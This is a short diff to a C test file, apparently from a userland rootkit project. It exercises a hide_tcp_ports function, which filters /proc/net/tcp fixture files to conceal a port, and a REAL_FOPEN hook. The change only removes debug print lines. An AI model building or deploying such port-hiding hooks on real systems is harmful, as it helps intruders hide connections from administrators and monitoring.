@@ -7,22 +7,18 @@
 #define BUF_SIZE 24000
 void    test_hide_tcp_ports(unsigned int *count, unsigned int *total) {
 
-    printf("blabla\n");
     char buf_1[BUF_SIZE] = {0};
     FILE *file_1 = REAL_FOPEN("./hide_tcp_ports/proc-net-tcp-without-hidden_port.txt", "r");
     fread(buf_1, BUF_SIZE, 1, file_1);
 
-    printf("blabla\n");
     char buf_2[BUF_SIZE] = {0};
     FILE *file_2 = fopen("hide_tcp_ports/proc-net-tcp-with-hidden_port.txt", "r");
     fread(buf_2, BUF_SIZE, 1, file_2);
 
-    printf("blabla\n");
     FILE *_file_1 = hide_tcp_ports("hide_tcp_ports/proc-net-tcp-without-hidden_port.txt");
     char _buf_1[BUF_SIZE] = {0};
     fread(_buf_1, BUF_SIZE, 1, _file_1);
 
-    printf("blabla\n");
     FILE *_file_2 = hide_tcp_ports("hide_tcp_ports/proc-net-tcp-with-hidden_port.txt");
     char _buf_2[BUF_SIZE] = {0};
     fread(_buf_2, BUF_SIZE, 1, _file_2);
